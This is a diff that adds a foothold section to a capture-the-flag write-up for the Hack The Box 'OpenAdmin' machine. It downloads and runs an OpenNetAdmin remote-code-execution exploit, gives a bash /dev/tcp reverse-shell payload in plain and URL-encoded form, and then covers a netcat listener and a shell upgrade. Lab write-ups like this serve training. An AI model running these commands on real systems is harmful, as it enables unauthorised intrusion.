@@ -77,15 +77,18 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /artwork (Status: 301)
 ```
 
-Let's check the found directories. I started with `/music`.
+## Footholding
+
+Let's check the found directories and start with `/music`.
 
 > http://10.10.10.171/music
 
-After clicking on `login` i got redirected.
+After clicking on `login` we are getting redirected.
 
 > http://10.10.10.171/ona/
 
-
+If we use google to check for an alrady available exploit, we will find the
+following one on exploit-db.
 
 > https://www.exploit-db.com/exploits/47691
 
@@ -115,20 +118,103 @@ while true;do
 done
 ```
 
+At first we download the raw exploit.
+
 ```console
 $ wget https://www.exploit-db.com/raw/47691
 ```
-
+Then we make it executable.
 
 ```console
 $ chmod +x 47691.sh
 ```
+At last we start the shell script and point it to the target url.
+And a shell is popping up.
 
 ```shell
 ./47691.sh http://10.10.10.171/ona/
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+Please make sure you don't forgett the `/` behind `ona` because that would break
+your reverse shell.
+
+Now this is a pretty restricted shell because we only can enter url encoded input
+to get code execution.
+
+In my case i used the `Burp Suite` included decoder to encode my payload for a
+full working reverse shell.
+
+> Payload:
+
+```bash
+$ bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
+```
+
+> Encoded payload
+
+```console
+%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
+```
+
+At this point we have to start a netcat listener on our desired port, then enter
+the url encoded string to our shell to get the reverse shell.
+
+```bash
+$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470
+bash: cannot set terminal process group (995): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@openadmin:/opt/ona/www$
+```
+
+To upgrade our shell to a bit more comfy one, we use python to import `/bin/bash`
+and then we modify our shell output and exporting xterm.
+
+```console
+www-data@openadmin:/opt/ona/www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+This was the first part. For the next part you have to exactly enter the following
+inputs, otherwise you will break your shell.
+
+```console
+Ctrl + z
+stty raw -echo
+fg
+Enter
+Enter
+export XTERM=xterm
+```
+
+If you entered everything correctly, you will get a full working shell on the box.
+
+```console
+www-data@openadmin:/opt/ona/www$ ^Z
+[1]+  Stopped                 nc -lnvp 9001
+$ stty raw -echo
+$ nc -lnvp 9001
+
+www-data@openadmin:/opt/ona/www$
+www-data@openadmin:/opt/ona/www$ export XTERM=xterm
+www-data@openadmin:/opt/ona/www$ ls
+.htaccess.example  images/            login.php          winc/
+config/            include/           logout.php         workspace_plugins/
+config_dnld.php    index.php          modules/
+dcm.php            local/             plugins/
+www-data@openadmin:/opt/ona/www$ ls
+```
+
+Please notice that this only works with bash. If you are using zsh you may ran into some issues.
+
+## Enumeration
+
+At first we start with some basic manually enumeration on the `/var/www/html` directory.
+
+XYZ
 
 
 # Resources
